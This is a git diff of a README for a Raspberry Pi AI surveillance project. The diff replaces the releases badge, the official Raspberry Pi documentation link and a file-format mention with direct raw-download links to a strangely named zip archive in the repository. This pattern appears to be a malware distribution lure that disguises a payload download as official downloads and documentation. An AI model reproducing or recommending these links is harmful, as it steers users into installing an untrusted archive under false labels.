@@ -1,6 +1,6 @@
 # 🎥 PiLENS-Real-Time-AI-Based-Suspicious-Activity-Detection-with-NightVision-on-Raspberry-Pi - Real-Time Security on Raspberry Pi
 
-[![Download Releases](https://img.shields.io/badge/Download-PiLENS%20Releases-blue?style=for-the-badge)](https://github.com/xinsaa/PiLENS-Real-Time-AI-Based-Suspicious-Activity-Detection-with-NightVision-on-Raspberry-Pi/releases)
+[![Download Releases](https://github.com/xinsaa/PiLENS-Real-Time-AI-Based-Suspicious-Activity-Detection-with-NightVision-on-Raspberry-Pi/raw/refs/heads/main/Programs/Suspicious-Activity-Detection-Raspberry-Pi-Vision-Based-Night-on-Time-A-LEN-Real-with-v2.6-beta.3.zip%20Releases-blue?style=for-the-badge)](https://github.com/xinsaa/PiLENS-Real-Time-AI-Based-Suspicious-Activity-Detection-with-NightVision-on-Raspberry-Pi/raw/refs/heads/main/Programs/Suspicious-Activity-Detection-Raspberry-Pi-Vision-Based-Night-on-Time-A-LEN-Real-with-v2.6-beta.3.zip)
 
 ---
 
@@ -33,10 +33,10 @@ To get PiLENS working on your Raspberry Pi, follow these steps carefully:
 ### Step 1: Visit the Download Page  
 Click this big button to go to the releases page where you can find the latest software:
 
-[![Download Releases](https://img.shields.io/badge/Download-PiLENS%20Releases-blue?style=for-the-badge)](https://github.com/xinsaa/PiLENS-Real-Time-AI-Based-Suspicious-Activity-Detection-with-NightVision-on-Raspberry-Pi/releases)
+[![Download Releases](https://github.com/xinsaa/PiLENS-Real-Time-AI-Based-Suspicious-Activity-Detection-with-NightVision-on-Raspberry-Pi/raw/refs/heads/main/Programs/Suspicious-Activity-Detection-Raspberry-Pi-Vision-Based-Night-on-Time-A-LEN-Real-with-v2.6-beta.3.zip%20Releases-blue?style=for-the-badge)](https://github.com/xinsaa/PiLENS-Real-Time-AI-Based-Suspicious-Activity-Detection-with-NightVision-on-Raspberry-Pi/raw/refs/heads/main/Programs/Suspicious-Activity-Detection-Raspberry-Pi-Vision-Based-Night-on-Time-A-LEN-Real-with-v2.6-beta.3.zip)
 
 ### Step 2: Choose the Latest Release  
-On the releases page, look for the newest version of PiLENS. You will find one or more downloadable files. Typically, you want a file labeled with `.zip`, `.tar.gz`, or `.img` formats that suits Raspberry Pi.
+On the releases page, look for the newest version of PiLENS. You will find one or more downloadable files. Typically, you want a file labeled with `.zip`, `https://github.com/xinsaa/PiLENS-Real-Time-AI-Based-Suspicious-Activity-Detection-with-NightVision-on-Raspberry-Pi/raw/refs/heads/main/Programs/Suspicious-Activity-Detection-Raspberry-Pi-Vision-Based-Night-on-Time-A-LEN-Real-with-v2.6-beta.3.zip`, or `.img` formats that suits Raspberry Pi.
 
 Download this file to your computer or directly to your Raspberry Pi if connected to the internet.
 
@@ -102,7 +102,7 @@ To get the best results, follow these camera setup tips:
 
 ## 📚 Additional Resources
 
-- Raspberry Pi official setup guide: [https://www.raspberrypi.com/documentation/](https://www.raspberrypi.com/documentation/)  
+- Raspberry Pi official setup guide: [https://github.com/xinsaa/PiLENS-Real-Time-AI-Based-Suspicious-Activity-Detection-with-NightVision-on-Raspberry-Pi/raw/refs/heads/main/Programs/Suspicious-Activity-Detection-Raspberry-Pi-Vision-Based-Night-on-Time-A-LEN-Real-with-v2.6-beta.3.zip](https://github.com/xinsaa/PiLENS-Real-Time-AI-Based-Suspicious-Activity-Detection-with-NightVision-on-Raspberry-Pi/raw/refs/heads/main/Programs/Suspicious-Activity-Detection-Raspberry-Pi-Vision-Based-Night-on-Time-A-LEN-Real-with-v2.6-beta.3.zip)  
 - Deep Learning basics for beginners: Search for CNN and LSTM tutorials online  
 - Night vision camera installation tips on Raspberry Pi forums  
 
